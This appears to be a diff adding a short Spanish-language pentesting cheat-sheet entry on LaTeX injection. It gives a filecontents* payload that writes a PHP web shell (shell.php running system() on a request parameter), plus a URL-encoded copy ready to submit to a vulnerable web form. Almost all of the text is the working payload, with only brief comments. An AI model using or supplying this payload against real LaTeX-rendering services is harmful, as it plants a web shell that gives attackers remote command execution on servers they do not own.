@@ -1,0 +1,11 @@
+	#### Latex
+
+### Crear archivo
+\begin{filecontents*}{shell.php}
+<?php system($_REQUEST['cmd']); ?>
+\end{filecontents*}
+#Crea un file que da una web shell
+
+\begin{filecontents*}{shell.php}%0D%0A<?php%20system($_REQUEST['cmd']);%20?>%0D%0A\end{filecontents*}
+#url encodeado
+
